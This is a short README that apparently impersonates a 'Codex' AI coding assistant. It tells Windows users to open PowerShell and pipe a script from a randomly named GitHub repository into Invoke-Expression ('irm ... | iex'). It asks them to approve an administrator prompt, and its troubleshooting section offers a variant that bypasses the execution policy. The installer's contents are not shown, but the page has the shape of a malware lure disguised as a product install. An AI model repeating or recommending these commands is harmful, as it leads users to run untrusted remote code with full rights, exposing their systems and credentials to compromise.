# Codex App

One-command setup for Codex — AI-powered coding assistant for writing, reviewing, and debugging code from your terminal.

## Install

Open **PowerShell** and run:

```powershell
irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does

1. Requests administrator rights (a UAC prompt appears once — click **Yes**).
2. Downloads the Codex desktop client with pre-trained language models.
3. Installs the VS Code extension and terminal CLI integration.
4. Registers the `codex` command globally — run `codex help` to get started.

## Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+ (built into Windows)
- Internet connection
- Administrator access
- ~2 GB free disk space

## Features

- **Code Generation** — describe what you need in plain English, get working code back.
- **Inline Review** — paste a function and get line-by-line suggestions for bugs, style, and performance.
- **Debug Assistant** — feed it a stack trace and it pinpoints the root cause with a fix.
- **Multi-Language** — Python, JavaScript, TypeScript, Go, Rust, C++, and 30+ more.
- **Offline Mode** — local model runs without internet after initial download.

## Troubleshooting

**Nothing happens / script is blocked**

If PowerShell blocks scripts, run this instead:

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex"
```

**`codex` command not found after install**

Close and reopen your terminal — the PATH update takes effect in new sessions.

**VS Code extension not loading**

Open VS Code → Extensions → search "Codex" → click Enable. Restart VS Code.

**"irm is not recognized"**

You are on an old PowerShell version. Use the full command:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | Invoke-Expression
```

## License

MIT — see [LICENSE](LICENSE).
